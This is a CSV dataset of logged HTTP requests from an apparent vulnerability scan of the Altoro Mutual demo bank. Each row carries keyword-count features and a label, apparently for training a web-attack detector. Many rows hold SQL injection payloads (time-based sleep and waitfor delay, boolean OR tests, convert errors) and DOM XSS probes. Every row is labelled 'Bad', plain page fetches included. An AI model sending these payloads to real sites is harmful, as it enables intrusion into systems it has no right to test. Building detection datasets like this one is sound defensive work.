method,path,body,single_q,double_q,dashes,braces,spaces,at_sign,braces2,sleep,drop,uid,select,waitfor,delay,system,union,group by,order by,version,benchmark,INJ,ECT,xxx,admin,type
GET,/retirement.htm,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/sitemap.xml.gz,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/doLogin,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/inside_points_of_interest.htm,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/grouplife.htm,,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/my%20documents,,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/sitemap.xml,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%40email.tst,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents,,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/doSubscribe,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/my%20documents/JohnSmith,,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/images/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/swagger-ui-bundle.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/swagger-ui-standalone-preset.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/survey_questions.jsp?step=a,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/sendFeedback,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tkhliumv&subject=1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/security.htm,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/pr/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/survey_questions.jsp?step=b,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/altoro/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/favicon.ico,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/favicon.ico,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/favicon.ico,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,"/swagger/index.html?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)",,1,3,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/swagger-ui-standalone-preset.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/swagger-ui-bundle.js,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=AltoroMutual,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,"/high_yield_investments.htm?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)",,1,3,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,"/subscribe.jsp?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)",,1,3,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,"/status_check.jsp?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)",,1,3,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/altoro/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,"/login.jsp?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22)",,1,3,0,2,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/altoro/images,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/altoro,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=1'%22,,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=AltoroMutual,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/index.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/high_yield_investments.htm,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/search.jsp?query=1,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/search.jsp?query=1'%22,,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/index.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=1'%22&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,1,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/1'%22.htm,,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=%5c,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/1'%22.html,,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/search.jsp?query=%5c,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=%5c&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=1%00%c0%a7%c0%a2,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/%5c.htm,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=PMaSTN3k&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=VbPIouSr,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/pSWR3Wn8.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/%5c.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/search.jsp?query=PgGDnRpY,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/search.jsp?query=1%00%c0%a7%c0%a2,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=1%00%c0%a7%c0%a2&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=%40%40KFiUS,,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/1%00%c0%a7%c0%a2.htm,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/1%00%c0%a7%c0%a2.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=-1%20OR%202%2b879-879-1%3d0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/search.jsp?query=%40%40bYCtV,,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/index'%20AND%202*3*8%3d6*8%20AND%20'WKEq'%3d'WKEq.html,,4,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=-1%20OR%202%2b412-412-1%3d0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,0,1,0,4,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/search.jsp?query=1*1*1*1,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=%40%40ZUofz&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=JyI%3d,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/%40%40kCb2k.htm,,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/%40%40atzKy.html,,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/search.jsp?query=JyI%3d,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=-1%20OR%202%2b672-672-1%3d0%2b0%2b0%2b1,,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=-1%20OR%202%2b497-497-1%3d0%2b0%2b0%2b1&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/index%22%20AND%202*3*8%3d6*8%20AND%20%22Bxqi%22%3d%22Bxqi.html,,0,4,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=JyI%3d&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=%bf'%bf%22,,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/JyI%3d.htm,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/JyI%3d.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/search.jsp?query=%bf'%bf%22,,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=-1'%20OR%202%2b19-19-1%3d0%2b0%2b0%2b1%20--%20,,1,0,1,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=-1'%20OR%202%2b537-537-1%3d0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,1,0,1,0,4,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/index%25'%20AND%202*3*8%3d6*8%20AND%20'6n6l'%21%3d'6n6l%25.html,,4,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=%bf'%bf%22&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,1,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=%f0''%f0%22%22,,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/%bf'%bf%22.htm,,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/%bf'%bf%22.html,,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=-1'%20OR%202%2b130-130-1%3d0%2b0%2b0%2b1%20or%20'SSXb214D'%3d',,4,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/search.jsp?query=%f0''%f0%22%22,,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=-1'%20OR%202%2b908-908-1%3d0%2b0%2b0%2b1%20or%20'FvMQkgar'%3d'&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,4,0,0,0,4,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=%f0''%f0%22%22&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,2,2,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/.html,,2,2,0,14,0,0,14,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=(select%20convert(int%2cCHAR(65))),,0,0,0,3,1,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/%f0''%f0%22%22.htm,,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/%f0''%f0%22%22.html,,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/search.jsp?query=(select%20convert(int%2cCHAR(65))),,0,0,0,3,1,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=-1%22%20OR%202%2b520-520-1%3d0%2b0%2b0%2b1%20--%20,,0,1,1,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=-1%22%20OR%202%2b29-29-1%3d0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,0,1,1,0,4,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=(select%20convert(int%2cCHAR(65)))&comments=1&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,0,0,0,3,1,1,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/(select%20convert(int%2cCHAR(65))).htm,,0,0,0,3,1,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/search.jsp?query=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/,,2,2,0,14,0,0,14,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'%22%2b(select(0)from(select(sleep(6)))v)%2b%22*/.html,,2,2,0,15,0,0,15,3,0,0,6,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/,,2,2,0,14,0,0,14,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/(select%20convert(int%2cCHAR(65))).html,,0,0,0,3,1,0,3,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=if(now()%3dsysdate()%2csleep(6)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(6)%2c0))OR%22*/&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,2,2,0,14,0,1,14,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/survey_questions.jsp?step=b,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/1%20waitfor%20delay%20'0:0:9'%20--%20.html,,2,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
GET,/search.jsp?query=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,,2,2,0,15,0,0,15,3,0,0,6,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/,,2,2,0,15,0,0,15,3,0,0,6,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'%22%2b(select(0)from(select(sleep(9)))v)%2b%22*/&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,2,2,0,15,0,1,15,3,0,0,6,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/survey_questions.jsp?step=1'%22,,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/dXXgWHVK.htm,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1'%22&email_addr=sample%40email.tst&name=tquhvjrr&subject=1,1,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/search.jsp?query=-1;%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
GET,/swagger/U2i0z35K';%20waitfor%20delay%20'0:0:9'%20--%20.html,,3,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/util/serverStatusCheckService.jsp?HostName=1%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
POST,/sendFeedback,submit=Submit&cfile=1%20waitfor%20delay%20'0:0:3'%20--%20&comments=1&email_addr=sample%40email.tst&name=dudxbugh&subject=1,2,0,1,0,5,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,Bad
GET,/,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
GET,/survey_questions.jsp?step=%5c,,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Bad
